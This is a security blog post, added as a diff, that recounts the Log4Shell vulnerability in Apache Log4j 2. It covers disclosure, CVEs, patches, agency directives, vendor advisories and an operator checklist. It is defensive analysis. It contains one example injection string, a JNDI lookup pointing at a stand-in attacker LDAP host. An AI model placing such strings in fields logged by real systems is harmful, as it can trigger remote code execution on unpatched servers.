@@ -1,0 +1,282 @@
+---
+slug: log4shell-and-the-library-nobody-owned
+title: "Log4Shell and the library nobody owned: when writing a log line became an input path"
+summary: "In December 2021 a feature of Apache Log4j 2 turned the most ordinary thing a Java program does, writing a line to a log, into a way for a stranger to run code on the server. Four CVEs and nine releases across three Java lines followed in under three weeks. Almost five years on, the word the US review board chose for it, endemic, still holds. This is the history from the parties' own documents, what changed afterwards, and what an operator should still check."
+author: "Rodolfo Nützmann"
+date: "2026-10-30"
+tags: ["vulnerability-management", "disclosure", "supply-chain"]
+category: security
+status: reviewed
+updated: "2026-11-02"
+relatedArticles: ["the-interpreter-problem", "the-disclosure-record", "how-systems-fail", "waf-family-history"]
+---
+
+## A log line that ran code
+
+On 10 December 2021 the Apache Software Foundation (ASF) made Log4j 2.15.0 available and published CVE-2021-44228, a flaw in one of the most widely used logging libraries in the Java world. By the end of the next day the US Cybersecurity and Infrastructure Security Agency (CISA) had put it in its Known Exploited Vulnerabilities (KEV) catalogue, Germany's Federal Office for Information Security (BSI) had raised its warning to red, and the UK's National Cyber Security Centre (NCSC-UK) had published an alert. The name the industry gave it, Log4Shell, said what mattered: a logging library had become a remote shell.
+
+I wrote about the class of flaw in the Learn article [Shellshock and Log4Shell: when the vulnerability is a feature](/learn/the-interpreter-problem), and I will not repeat it here. This post is about the event: who found it and how it got out, what the patch chain looked like, how governments and vendors responded, why the first report of the US Cyber Safety Review Board (CSRB) called it endemic, what changed afterwards, and what is still worth checking almost five years on. It is also a companion to [PHP2Shell and the layer nobody thinks they own](/blog/php2shell-and-the-layer-nobody-owns). That post asked who owns the runtime under a website. Log4j asks the same question one layer further down, about a library most of the people exposed to it had never chosen.
+
+Everything below comes from the parties' own documents: Apache's security page, release notes, issue tracker and repository, the CVE (Common Vulnerabilities and Exposures) records Apache published as the numbering authority, the advisories and directives of the agencies involved, the CSRB's report and the vendors' own pages. They are listed under Sources. Where a figure is my own count or a sentence my own judgement, I say so.
+
+## What Log4j is, and why it was everywhere
+
+Log4j is the Java logging library of the Apache Logging Services project. Version 1 dates from January 2000. Log4j 2, a rewrite, had its first general-availability release on 12 July 2014, "after thirteen prior releases over the last 4 years", in the words of its release notes. A logging library is about the most boring dependency there is, and that is exactly why it was everywhere: every program needs to write down what it did, and a great many Java programs did it with Log4j, either because their developers chose it or because a framework they used had.
+
+NCSC-UK's alert gave a sense of the reach: Apache frameworks such as Struts 2, Solr, Druid and Flink included it, and so did large projects such as Netty, MyBatis and the Spring Framework. CISA's guidance page added the part that matters most to people who run networks: Log4j was used in consumer and enterprise services, websites and applications, "as well as in operational technology products".
+
+The best measurement of the reach came from Google's Open Source Insights team, which surveyed every version of every artifact in Maven Central, the main public repository of Java packages. As of 16 December 2021 it counted 35,863 artifacts, more than 8% of the repository, that depended on affected Log4j code. That first count included packages that used only log4j-api; once the CVE was clarified to affect only log4j-core, Google's editor's note put the figure at over 17,000, roughly 4%, as of 19 December. The first number is four times, and the second twice, what Google gave as the average for a Maven advisory, 2% of the ecosystem, and both are far above the median, under 0.1%. And the shape of the dependency mattered more than its size. Only around 7,000 artifacts depended on Log4j directly; for more than 80% of the affected packages it sat more than one level deep in the dependency graph, for most of them five levels down, and for some nine.
+
+That is the first half of the story: a library that most of its users met as a dependency of a dependency. The second half is that Java runs inside appliances. A load balancer's management system, a security information and event management (SIEM) platform, a virtual desktop gateway: if it was built in Java, there was a fair chance it carried Log4j inside a box its owner could not open. I come back to the vendors' lists below.
+
+## The feature, at the level of Apache's advisory
+
+Log4j Core has what Apache's manual calls "a flexible and extensible property substitution system". An expression naming a prefix and a key is handed to a lookup plugin registered for that prefix, and the plugin fetches the value from somewhere: an environment variable, a system property, the Java runtime. In a configuration file this is useful and harmless, because whoever writes the configuration is trusted.
+
+One of those plugins was a lookup for JNDI, the Java Naming and Directory Interface, the Java API for fetching named objects from naming and directory services such as a server speaking the Lightweight Directory Access Protocol (LDAP). It arrived as a community contribution in 2013: Apache's issue tracker records "JNDI Lookup plugin support" as opened on 17 July 2013 and shipped in 2.0-beta9, and the CSRB describes it as a "community-submitted feature" accepted through a standard process.
+
+The flaw was where lookups were evaluated. Apache's 2.16.0 release notes say it plainly: before 2.15.0, Log4j "would automatically resolve Lookups contained in the message or its parameters" when the Pattern Layout formatted a log event. So a lookup expression did not have to be in the configuration. It could be in the data being logged. Apache's advisory, as its security page carries it today, describes the result in two sentences: the JNDI features used in configuration, log messages and parameters "do not protect against attacker-controlled LDAP and other JNDI related endpoints", and "an attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers". Only the log4j-core JAR (Java archive) was affected; an application with log4j-api alone was not.
+
+In Apache's own notation, the manual writes a lookup as `${prefix:key}` and gives the JNDI lookup's syntax as `jndi:<name>`, where the name is a JNDI name. So a value such as `${jndi:ldap://attacker.example/a}`, arriving in any field the application then logged, was not text to a vulnerable log4j-core but a lookup to resolve: formatting the message meant a JNDI request to the LDAP server at attacker.example and, in the summary line Apache's security page still gives CVE-2021-44228, "JNDI lookup can be exploited to execute arbitrary code loaded from an LDAP server". The affected versions are 2.0-beta9 to 2.14.1, with 2.3.1 and 2.12.2 as the fixed releases for Java 6 and 7. In today's manual the same lookup does nothing unless the log4j2.enableJndiLookup property is set to true, and even then accepts only the `java:` protocol.
+
+The joint advisory that eight agencies published on 22 December 2021 names the endpoints that mattered in practice, LDAP, the Domain Name System and other JNDI-related ones, and its egress advice adds Java's Remote Method Invocation (RMI). CISA's emergency directive added the sentence that every network engineer should keep: exploitation "can occur even if the software accepting data input is not written in Java", because that software can pass the string on to back-end systems that are. Beyond that, I leave the mechanics to the advisories.
+
+<figure className="gloss-figure">
+<svg role="img" aria-labelledby="l4j-flow-title l4j-flow-desc" width="100%" height="470" viewBox="0 0 340 470" preserveAspectRatio="xMidYMin meet" fill="currentColor">
+<title id="l4j-flow-title">Where Log4Shell crossed the network</title>
+<desc id="l4j-flow-desc">From top to bottom: anyone on the internet puts a string into a field that will be logged; a front end such as a web server, load balancer or web application firewall passes the field on or logs it; a Java back end or log collector running log4j-core 2.0-beta9 to 2.14.1 writes it to a log and the message lookup resolves it; the server then opens an outbound JNDI request over LDAP, RMI or DNS to an endpoint the attacker chose, crossing a dashed line that marks where egress filtering would stop it; with LDAP, code is loaded from that endpoint and run.</desc>
+<defs><marker id="l4j-arrow" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="currentColor" /></marker></defs>
+<rect x="8" y="8" width="324" height="44" rx="6" fill="currentColor" fillOpacity="0.05" stroke="currentColor" strokeOpacity="0.5" />
+<text x="20" y="26" fontSize="13" fontWeight="700">Anyone on the internet</text>
+<text x="20" y="42" fontSize="11" fillOpacity="0.8">puts a string in any field that will be logged</text>
+<line x1="170" y1="52" x2="170" y2="64" stroke="currentColor" strokeWidth="1.5" markerEnd="url(#l4j-arrow)" />
+<rect x="8" y="66" width="324" height="44" rx="6" fill="currentColor" fillOpacity="0.05" stroke="currentColor" strokeOpacity="0.5" />
+<text x="20" y="84" fontSize="12" fontWeight="700">Front end: web server, load balancer, WAF</text>
+<text x="20" y="100" fontSize="11" fillOpacity="0.8">any language; logs the field or passes it on</text>
+<line x1="170" y1="110" x2="170" y2="122" stroke="currentColor" strokeWidth="1.5" markerEnd="url(#l4j-arrow)" />
+<rect x="8" y="124" width="324" height="104" rx="6" fill="currentColor" fillOpacity="0.05" stroke="currentColor" strokeOpacity="0.5" />
+<text x="20" y="142" fontSize="13" fontWeight="700">Java back end, or the log collector</text>
+<text x="20" y="157" fontSize="11" fillOpacity="0.8">anything that writes the field with log4j-core</text>
+<rect x="20" y="168" width="300" height="48" rx="4" fill="currentColor" fillOpacity="0.2" stroke="currentColor" strokeWidth="2.5" />
+<text x="170" y="187" fontSize="11.5" fontWeight="700" textAnchor="middle">log4j-core 2.0-beta9 to 2.14.1</text>
+<text x="170" y="204" fontSize="11" textAnchor="middle">the message lookup resolves the string</text>
+<line x1="170" y1="228" x2="170" y2="300" stroke="currentColor" strokeWidth="1.5" markerEnd="url(#l4j-arrow)" />
+<text x="180" y="252" fontSize="10.5" fontWeight="700">outbound JNDI request</text>
+<text x="180" y="265" fontSize="10.5">LDAP, RMI or DNS</text>
+<line x1="8" y1="280" x2="332" y2="280" stroke="currentColor" strokeWidth="1.5" strokeDasharray="6 4" />
+<text x="20" y="294" fontSize="10.5" fontWeight="700">egress filter: servers do not call out</text>
+<rect x="8" y="302" width="324" height="60" rx="6" fill="currentColor" fillOpacity="0.05" stroke="currentColor" strokeOpacity="0.5" />
+<text x="20" y="320" fontSize="13" fontWeight="700">Endpoint the attacker chose</text>
+<text x="20" y="336" fontSize="11" fillOpacity="0.8">LDAP: code loaded from it and run</text>
+<text x="20" y="351" fontSize="11" fillOpacity="0.8">DNS: the query itself can carry data out</text>
+<rect x="8" y="378" width="324" height="84" rx="6" fill="none" stroke="currentColor" strokeOpacity="0.35" strokeDasharray="3 3" />
+<text x="20" y="396" fontSize="11" fontWeight="700">The front end need not be vulnerable</text>
+<text x="20" y="412" fontSize="11" fillOpacity="0.85">or written in Java to pass the string on.</text>
+<text x="20" y="428" fontSize="11" fillOpacity="0.85">Full request logging can carry it to a</text>
+<text x="20" y="444" fontSize="11" fillOpacity="0.85">vulnerable collector deep inside the network.</text>
+</svg>
+<figcaption className="gloss-figure-caption">Simplified from Apache's advisory, CISA's Emergency Directive 22-02 and the joint advisory AA21-356A; the note about full request logging is F5's, in K19026212; the DNS line is NCSC-UK's. The dashed line is where the joint advisory's egress recommendations would have cut the chain.</figcaption>
+</figure>
+
+One more document belongs here, because it is the clearest statement of the lesson I know. Apache's security page now carries a threat model for all its logging frameworks, and it says, without qualification: "Log4cxx, Log4j, and Log4net do not trust log messages." It counts as in scope an adversary who can submit input "that resembles the framework's own interpolation or lookup syntax". Read in 2026, that is a sentence about December 2021.
+
+## The fortnight, from Apache's records and the review board's account
+
+The CSRB reconstructed the disclosure from interviews and requests for information, including the ASF's own answers, and Apache's issue tracker and repository confirm the public parts. Times are UTC where the source gives one.
+
+| Date (2021) | Event | Source |
+| --- | --- | --- |
+| 24 November, 07:51 | An engineer of the Alibaba Cloud Security Team reports the flaw to the ASF by email, with a description, a pointer to the code, a proof of concept and screenshots. Apache credits Chen Zhaojun of the Alibaba Cloud Security Team | CSRB report; Apache security page |
+| 26 November | CVE-2021-44228 reserved | CVE record |
+| 29 November | Issue LOG4J2-3198, "Message lookups should be disabled by default", opened at 13:54; a public pull request makes the change | Apache issue tracker; Log4j repository; CSRB |
+| 30 November | A second public pull request restricts LDAP access through JNDI | Log4j repository; CSRB |
+| 1 December | The earliest known exploitation, observed by a technology services company over two days, which it assessed as consistent with testing of the reporter's proof of concept | CSRB report |
+| 5 December | Issue LOG4J2-3201, "Limit the protocols JNDI can use and restrict LDAP", opened; the fix is committed | Apache issue tracker; CSRB |
+| 6 December | Release candidate 2.15.0-rc1 tagged, the date Apache's release notes give for 2.15.0; no advisory yet | CSRB; Apache release notes |
+| 9 December | The reporter tells the ASF the flaw is being discussed on WeChat, in a post by BoundaryX, a cybersecurity company based in China, with a redacted screenshot of a proof of concept; public reports of exploitation follow | CSRB report |
+| 10 December | The ASF releases 2.15.0 and makes the CVE public; CISA adds it to KEV with a due date of 24 December; NCSC-UK and CERT-EU publish | CSRB; CVE record; KEV; NCSC-UK; CERT-EU |
+| 11 December | BSI raises its cyber security warning to its red level; CISA's director issues a statement | BSI; CISA |
+| 13 December | 2.16.0 removes message lookups and disables JNDI by default; Alibaba notifies China's Ministry of Industry and Information Technology (MIIT), according to what the Chinese government told the CSRB | Apache release notes; CSRB |
+| 14 December | CVE-2021-45046 (the 2.15.0 fix was incomplete) and CVE-2021-4104 (Log4j 1.2) published | CVE records |
+| 17 December | 2.17.0; CISA issues Emergency Directive 22-02; CVE-2021-45046 re-rated from 3.7 to 9.0 | Apache release notes; CISA; CERT-EU; NCSC-UK |
+| 18 December | CVE-2021-45105, a denial of service through recursive lookups, published | CVE record |
+| 22 December | Joint advisory AA21-356A from eight agencies in five countries | CISA |
+| 27 to 28 December | 2.17.1 for CVE-2021-44832, which needs control of the logging configuration; the CVE is published on the 28th | Apache release notes; CVE record |
+| 29 December | The Java 7 and Java 6 lines, 2.12.x and 2.3.x, reach end of maintenance | Apache download page |
+
+Three things in that table deserve a comment.
+
+The first is the embargo that never was. The CSRB records that the ASF judged an embargo "impractical" because Log4j was so widely used, and reviewed the fix in two public pull requests from 29 November. A release candidate was tagged on 6 December without an advisory. The Board notes that BoundaryX's posts analysed that release candidate and calls it a "reasonable hypothesis" that the company, or someone related to it, found the flaw there; it adds that it could not verify this and that BoundaryX did not answer its questions. Log4j is an early and large case of a fix that went public before its advisory. A fix in a public repository is a disclosure, whatever the calendar says.
+
+The second is how little time anyone actually had. The CSRB found no evidence of exploitation by threat actors from China, Iran, North Korea or Russia before 9 December, after examining classified and unclassified information. The defenders' clock started on 9 and 10 December, and so did everyone else's.
+
+The third is a part of the story that is about law rather than code. The Chinese government told the Board that Alibaba notified MIIT on 13 December, after the ASF. The Board noted press reports from 22 December onwards that MIIT had suspended Alibaba from a threat information sharing partnership for not reporting in time, said it could find no official explanation, and recorded that the Chinese government did not answer its question about any sanction. It ended with a concern worth quoting: whether the enforcement of the mandatory vulnerability disclosure laws of the People's Republic of China (PRC) "may afford the PRC government early access to serious, exploitable vulnerabilities before they are patched". That is the Board's concern, not a finding, and I report it as such.
+
+## The patch chain
+
+Four CVEs in Log4j 2 in eighteen days, each fixed on three Java lines. This is the chain as Apache's own documents give it; the ratings are Common Vulnerability Scoring System (CVSS) version 3.1 base scores.
+
+| CVE | Published | What it is, in Apache's terms | Apache's rating | Fixed for Java 8+ / 7 / 6 |
+| --- | --- | --- | --- | --- |
+| CVE-2021-44228 | 10 Dec 2021 | JNDI features in configuration, log messages and parameters do not protect against attacker-controlled endpoints | 10.0 Critical | 2.15.0 / 2.12.2 / 2.3.1 |
+| CVE-2021-45046 | 14 Dec 2021 | The 2.15.0 fix was incomplete in certain non-default configurations using a Thread Context lookup | 9.0 Critical, first published as 3.7 | 2.16.0 / 2.12.2 in the CVE record, 2.12.3 on the security page / 2.3.1 |
+| CVE-2021-45105 | 18 Dec 2021 | Uncontrolled recursion from self-referential lookups, a denial of service | 5.9 Medium | 2.17.0 / 2.12.3 / 2.3.1 |
+| CVE-2021-44832 | 28 Dec 2021 | An attacker with write access to the logging configuration can make the JDBC (Java Database Connectivity) appender use a JNDI data source that runs remote code | 6.6 Medium | 2.17.1 / 2.12.4 / 2.3.2 in the CVE record and release notes; the security page lists earlier versions |
+
+What each release changed, in its release notes: 2.15.0 turned message lookups off by default and limited JNDI to a few protocols, with LDAP restricted by default; 2.16.0 removed message lookups completely and disabled JNDI by default; 2.17.0 stopped the recursive evaluation of lookups during logging, removed LDAP from JNDI altogether, and split the single switch for JNDI into three separate properties; 2.17.1 made the JDBC appender go through the same controls. The current manual says the JNDI lookup must be enabled explicitly since 2.17.0 and supports only the `java:` protocol.
+
+Two details in that table are worth more than their size. CVE-2021-45046 was first published as a denial of service rated 3.7; on 17 December, as CERT-EU and NCSC-UK both recorded, it was upgraded to remote code execution at 9.0. In the CVE record, Apache's own section has since described remote code execution, but its title still speaks of a denial of service and its rating is still 3.7, while the National Vulnerability Database (NVD) and CISA's enrichment give 9.0. And for CVE-2021-44832, Apache's security page as it stands lists 2.17.0, 2.12.3 and 2.3.1 as fixed, while the CVE record Apache itself published and the 2.17.1 release notes say the fix is in 2.17.1, 2.12.4 and 2.3.2. When a project's own documents disagree, take the later and stricter set. The CVE record, the release notes and CISA's guidance end the chain in the same place: 2.17.1, 2.12.4 and 2.3.2, which is what CISA told organisations to install from 28 December 2021. Apache's security page, as it stands, does not mention 2.17.1 or 2.12.4 at all.
+
+### The mitigations that were withdrawn
+
+The 2.15.0 release notes offered people who could not upgrade three stopgaps: a system property that stopped lookups in log messages, a pattern option that did the same per layout, and removing the JNDI classes from the core JAR. By the 2.17.1 release, Apache's security page, as published in the project's repository at that release's tag, listed the first two under "Older (discredited) mitigation measures": they "only limit exposure while leaving some attack vectors open", because the Thread Context path of CVE-2021-45046 bypassed them and Apache had found other code paths where message lookups could still occur. The same page said that 2.15.0's attempt to restrict JNDI LDAP lookups to the local host could be bypassed and that "users should not rely on this".
+
+Removing the JNDI lookup class stayed on the list as an acceptable workaround, in Apache's page and in the joint advisory, and CISA later added the operational catch: tracking each asset's mitigation status adds administrative overhead, so patching is preferred. Anyone who set the property in December 2021 and moved on was protected against part of the problem, and was later told by the project that it was not enough.
+
+### The Java lines, and Log4j 1
+
+The backports to the Java 7 line (2.12.x) and the Java 6 line (2.3.x) reached Maven Central on 14, 20 and 28 December (2.12.2, 2.12.3, 2.12.4) and on 21 and 29 December (2.3.1, 2.3.2), by the repository's directory listing. Apache's download page marks both lines end of maintenance from 29 December 2021, with 2.12.4 the "last release supporting Java 7" and 2.3.2 the last for Java 6. Its maintenance policy explains what that means: new releases, security fixes included, "are very unlikely".
+
+Log4j 1 is a different case, and Apache states it bluntly: Log4j 1 "reached End of Life in 2015", and vulnerabilities reported against it after August 2015 "are not checked and will not be fixed". It has no lookups, so Log4Shell itself does not apply, but it has its own JNDI exposure. CVE-2021-4104, published on 14 December 2021, affects the JMS (Java Message Service) appender of Log4j 1.2 when an attacker has write access to the configuration, and only where that appender is configured, which Apache notes is not the default. Three more followed on 18 January 2022: CVE-2022-23302 in JMSSink, CVE-2022-23305, an SQL injection in the JDBC appender through strings that an application logs, and CVE-2022-23307 in the Chainsaw component. With CVE-2019-17571 in the socket server and CVE-2020-9488 in the SMTP appender before them, Apache's Log4j 1 page lists six, and none will ever be fixed. CISA's directive told federal agencies that Log4j 1.x had been unsupported since 5 August 2015 and that they "should already have a plan in place to upgrade or replace" it.
+
+## Exploitation, and the response
+
+The volume came quickly. The CSRB cites Cloudflare observing 400 exploitation attempts per second five days after disclosure. The joint advisory recorded the Federal Bureau of Investigation (FBI) seeing attempted exploitation and widespread scanning to deploy cryptomining and botnet malware. BSI's update of 16 December reported the first ransomware attacks. NCSC-UK listed cases where actors had exploited VMware Horizon, MobileIron and Ubiquiti UniFi Network Application, and noted that almost every organisation would have received HTTP requests carrying the lookup string, so it did not need reports of scanning, only of malicious Java actually loaded.
+
+The governments' response is worth seeing side by side, because of how many institutions moved within a week.
+
+| Who | When | What |
+| --- | --- | --- |
+| CISA | 10 December 2021 | KEV entry for CVE-2021-44228, due 24 December |
+| CISA director Jen Easterly | 11 December | Statement: "End users will be reliant on their vendors" |
+| BSI | 11 December, updated 16 December | Warning raised to Warnstufe Rot, the red level, describing an extremely critical threat situation |
+| NCSC-UK | 10 December, updated eight times to 13 January 2022 | Alert with priority actions: patch, find unknown instances, monitor and block |
+| CERT-EU, the cybersecurity service of the EU institutions | 10 December, eleven versions to 29 January 2022 | Security Advisory 2021-067 |
+| European Commission, the EU Agency for Cybersecurity (ENISA), CERT-EU and the network of national computer security incident response teams (CSIRTs) | 15 December | Joint statement pointing to a shared list of vulnerable software kept by the Dutch NCSC |
+| CISA | 17 December | Emergency Directive 22-02 for federal civilian agencies |
+| CISA, the FBI, the National Security Agency (NSA) and the Australian, Canadian, New Zealand and UK agencies | 22 December | Joint advisory AA21-356A |
+
+The emergency directive is the most instructive of these documents, because it had to turn "find Log4j" into an order with a deadline. By 5 pm Eastern on 23 December, agencies had to enumerate every "solution stack" accepting data from the internet, check each piece of software against CISA's list on GitHub, and then patch, mitigate or remove; patching of internet-facing devices was to happen "under an emergency change window". They also had to assume compromise and monitor for anomalous traffic, naming outbound JNDI traffic over LDAP and RMI and "DMZ systems initiating outbound connections", the DMZ (demilitarised zone) being the segment that faces the internet. Reports were due on 28 December. The directive's own list of temporary mitigations, in CISA's repository, included isolating the stack in a "vulnerable network" VLAN (virtual local area network) and putting a web application firewall (WAF) in front of it, which it called "an important, but incomplete, solution". A page dated 8 April 2022 records that CISA closed the directive and moved its required actions under Binding Operational Directive 22-01, the directive under which CISA created the KEV catalogue.
+
+The joint advisory of 22 December, from CISA, the FBI, the NSA, the Australian Cyber Security Centre (ACSC), the Canadian Centre for Cyber Security (CCCS), CERT NZ, New Zealand's NCSC and NCSC-UK, is the one whose advice aged best, in my view: assume all versions of Java and Log4j are vulnerable when building the inventory, note that "patching or updating Java is not enough", keep a record of what was patched because "adversaries are patching and mitigating assets they compromise to retain control", and block outbound LDAP, RMI and DNS from anything that should not originate them. It also told vendors to avoid putting update information "behind paywalls".
+
+## The lists: vendor advisories as a phenomenon
+
+For most organisations the hard question in December 2021 was not "how do we patch Log4j" but "which of the things we bought contain it". The answer came as lists.
+
+CISA's was a community-sourced repository on GitHub, which the emergency directive made the reference for federal agencies: if a product was missing, agencies were told to request its addition with a pull request. By my count of its consolidated data file, it ended with 4,472 entries (273 of them name a vendor but no product) from 759 vendors, counting vendor names without regard to capitalisation; the most recent entry was updated on 1 November 2022, and the repository was archived on 2 February 2023. The Dutch NCSC kept a list of its own because, it explained, the volume of expected updates made it impractical to keep revising its formal advisory, and the European joint statement described it as the list the EU's national CSIRTs were updating together.
+
+Behind those lists sat hundreds of vendor advisories, each a product-by-product table. Two from platforms I teach show the range of answers a customer had to read. F5's K19026212, first published on 9 December 2021, lists BIG-IP (all modules), F5OS, NGINX and its cloud services as not vulnerable; BIG-IQ as containing the affected code but not vulnerable "in default, standard, or recommended configurations", with a separate article to remove the components; and Traffix SDC as vulnerable in its log-management components (an Elasticsearch, Fluentd and Kibana stack), rated High, with no fixed version listed. Fortinet's FG-IR-21-245, published on 12 December 2021, lists FortiOS, FortiAnalyzer, FortiManager, FortiMail, FortiSwitch and others as not impacted, and FortiSIEM, FortiAnalyzer-BigData, FortiPortal, FortiCASB, FortiAIOps, FortiPolicy, FortiSOAR and FortiEDR Cloud among the impacted, with fixed versions for several. It also documents something every firewall administrator should remember: its emergency intrusion prevention system (IPS) signature shipped with its default action set to pass, and customers had to change it themselves.
+
+My assessment of the phenomenon: the lists were indispensable and they had a shelf life. A list that a government stopped updating in November 2022 tells you nothing about the appliance you are still running in 2026, and for an appliance the only list that counts is its vendor's current advisory for your exact version.
+
+## The long tail
+
+The CSRB's first report, published on 11 July 2022, is the document that framed how Log4Shell is remembered. Its findings are sober. It was "not aware of any significant Log4j-based attacks on critical infrastructure systems", and found that exploitation had generally been lower than many experts predicted, while warning that "no authoritative source exists" to measure exploitation across geographies and industries. It recorded the cost of looking: one federal cabinet department reported spending 33,000 hours on its response. It praised much of what the ASF did and pointed at the "thinly-resourced, volunteer-based open source community". And it made the assessment that gave the report its headline: "Log4j is an endemic vulnerability", with vulnerable instances likely to remain "for many years to come, perhaps a decade or longer". Its 19 recommendations, in four groups, start with "Organizations should be prepared to address Log4j vulnerabilities for years to come".
+
+The record since then reads like a confirmation.
+
+| When | What the document says | Source |
+| --- | --- | --- |
+| February 2022 | Actors exploit Log4Shell in an unpatched VMware Horizon server at a US federal civilian agency, install a crypto miner, move to the domain controller and plant reverse proxies; CISA and the FBI assess them as Iranian government-sponsored | CISA and FBI, AA22-320A, 16 November 2022 |
+| April 2022 | Log4Shell heads the table of the top 15 routinely exploited vulnerabilities of 2021 | AA22-117A |
+| June 2022 | Threat actors, including state-sponsored ones, continue to exploit Log4Shell in VMware Horizon and Unified Access Gateway servers; affected VMware systems not updated promptly after VMware's December 2021 fixes are to be treated as compromised | CISA and US Coast Guard Cyber Command, AA22-174A |
+| May 2023 | CVE-2021-45046 added to KEV; the catalogue now marks both Log4j entries as known to be used in ransomware campaigns | KEV catalogue |
+| August 2023 | Log4Shell among the top routinely exploited vulnerabilities of 2022, and CVE-2021-45046 among the additional ones | AA23-215A |
+| November 2024 | Log4Shell in the table of the top 15 routinely exploited vulnerabilities of 2023 | AA24-317A |
+
+The February 2022 case is the one I would put in front of any change advisory board. The agency was compromised while the emergency directive was in force, through a product that had a vendor fix since December, on a server nobody had patched. The CSRB's "endemic" is not a metaphor. In the CVE record, CISA's own categorisation still reads exploitation active, automatable, total technical impact.
+
+## What changed afterwards
+
+### The software bill of materials stopped being theory
+
+The timing matters here. Executive Order 14028, signed on 12 May 2021, seven months before Log4Shell, had already directed the National Institute of Standards and Technology (NIST) to issue supply chain guidance that included "providing a purchaser a Software Bill of Materials (SBOM)", which it defined as a formal record of the components in a product, "analogous to a list of ingredients on food packaging", and said that those who operate software can use one "to quickly and easily determine whether they are at potential risk of a newly discovered vulnerability". In my reading, December 2021 was the first real test of that sentence, and the emergency directive's six days to enumerate every internet-facing solution stack show how far inventories were from passing it. The CSRB made improving SBOM tooling and adoption one of its recommendations.
+
+In Europe the requirement is now law. The Cyber Resilience Act, Regulation (EU) 2024/2847, requires manufacturers of products with digital elements to draw up an SBOM "covering at the very least the top-level dependencies", and applies in full from 11 December 2027. My assessment, from Google's numbers above: a bill of materials that stops at the top level would not have shown most of the places where Log4j actually was, because in more than 80% of affected packages it sat deeper. When you ask a vendor for an SBOM, ask how deep it goes.
+
+The Log4j project itself now practises what was asked of everyone. Since 2.22.0, released on 17 November 2023, every artifact ships with a CycloneDX SBOM, those SBOMs point to a vulnerability disclosure report the project maintains, and the reproducibility of its releases on Maven Central is checked independently.
+
+### Money, after the fact
+
+On 13 January 2022 the White House convened a meeting on the security of open-source software. The ASF's statement on the meeting, dated 14 January in its blog archive, said the path forward "will require upstream collaboration by the companies and organizations that consume and ship open source software". On 1 February the Open Source Security Foundation (OpenSSF) launched the Alpha-Omega project with an initial $5 million from Microsoft and Google, citing Log4j as the example of a library that forced organisations into crisis. On 12 May, a year after the executive order, the Linux Foundation and OpenSSF published a mobilisation plan of about $150 million over two years, with over $30 million pledged at the start by Amazon, Ericsson, Google, Intel, Microsoft and VMware.
+
+The money that reached Log4j's own maintainers came later and from a government. The Sovereign Tech Agency, which its site says is funded on the basis of a decision by the German Bundestag, invested €596,160 in Log4j through its Sovereign Tech Fund in 2023 and 2024, for the release pipeline, fuzz testing, documentation and similar work, and its page says that until then "the core maintainers had not received significant financial support". Apache's security page credits a Log4j bug bounty programme on YesWeHack funded by the same agency. The ASF's support page is explicit that the foundation does not employ anyone to develop or support its projects, and Log4j's maintenance policy says why only one line is maintained at a time: "Due to the limited resources of the Log4j project".
+
+## Three lessons from a network seat
+
+These are my assessments, argued from the documents above.
+
+**Logging is an input path.** We draw firewalls around the traffic that enters an application and treat the log pipeline as plumbing. Log4Shell showed that every field we write to a log is input to whatever reads it, and that the pipeline crosses trust boundaries no firewall rule describes: a request arrives at the edge, a load balancer or WAF logs it in full, a collector in the management network parses it, a SIEM indexes it. F5's advisory makes the point precisely: most of its own products were not vulnerable, but full request logging to a vulnerable remote system could still deliver the string. The most exposed machines in December 2021 were often ones that never faced the internet but read what the internet wrote. If you want to see how much of a single log line is data someone else chose, paste one into the [syslog message parser](/tools/syslog-message-parser); the [article on log levels](/learn/log-levels-across-systems-one-ladder-many-rungs) shows how Log4j's own ladder maps onto the others.
+
+**The dependency nobody owned.** In [the PHP post](/blog/php2shell-and-the-layer-nobody-owns) the runtime was the layer between two teams. Log4j was further down: a library inside a framework inside a product, five levels deep, maintained by volunteers whose foundation does not pay them and who, by the account of the agency that funded them in 2023, had not received significant financial support before. Nobody did anything wrong in the ordinary sense. Every team that pulled in a framework made a reasonable choice; the sum of those choices was a dependency on a handful of people that nobody had written down.
+
+**The box you cannot patch.** "End users will be reliant on their vendors" was the most honest sentence any government wrote that month. For an appliance, the inventory question has to be asked of the vendor, the fix arrives on the vendor's schedule, and the mitigation is network design: the joint advisory's egress blocks, the directive's warning about DMZ systems that initiate outbound connections, a jail VLAN for what cannot be fixed. The main exploitation path in the advisories ended with the server calling out to an endpoint the attacker chose. A server that may not open outbound connections, except to the few destinations it needs, turns that call into a log entry. Egress filtering is defence in depth, not a fix, but it is the control in this story that a network team owns outright.
+
+## What an operator should still do
+
+If I ran Java anywhere today, this is the list, in this order:
+
+1. **Find every Log4j 2 instance, not every application.** That includes copies inside other archives: Java applications often bundle their dependencies, and some repackage them into a single "fat" or shaded JAR, so the library may not appear under its own name. NCSC-UK told organisations to search inside JAR, WAR (web application archive) and EAR (enterprise application archive) files and warned that there could be several copies, each needing an update; CISA recommended file-system scanning in addition to network scans. Only log4j-core is affected; log4j-api on its own is not.
+2. **Be on a maintained version.** Anything from 2.17.1 on closes the 2021 family on Java 8 and later, but Apache maintains only the latest minor line. Its newest releases are 2.26.1 (29 June 2026) and 2.25.5 (1 July 2026), and its security page lists fixes for newer, medium-rated issues in the 2.25 line. Copies on 2.12.4 or 2.3.2 are on end-of-maintenance lines, which in practice means upgrading Java first.
+3. **Retire Log4j 1.** It has been end of life since 2015 and carries six CVEs that will never be fixed. Apache publishes a migration guide; until the migration is done, check that the components named in those CVEs, the JMS appender and sink, the JDBC and SMTP appenders, the socket server and Chainsaw, are not in use.
+4. **Do not rely on withdrawn mitigations.** A configuration that disables message lookups through a property or a pattern option, on a version older than 2.16.0, is a mitigation Apache called insufficient in December 2021. Removing the JNDI lookup class was an acceptable stopgap, but a stopgap that must be tracked on every asset; upgrading is the fix.
+5. **Filter egress from servers.** Deny outbound connections by default, allow LDAP and RMI only to known destinations, let only the designated DNS servers send queries out, and alert on DMZ hosts that open connections to the internet. In my assessment it would have broken the main exploitation path in 2021, and it will break the next one that needs a server to call home.
+6. **Treat the log pipeline as attack surface.** List what parses your logs, collectors, SIEM, analytics, and check their versions as you would an internet-facing server's, because they read internet-facing data.
+7. **Ask appliance vendors in writing.** For each product, the vendor's current advisory for your version, not an archived community list. For anything that sat unpatched after December 2021, the June 2022 advisory's instruction for VMware systems is the right default: treat it as compromised.
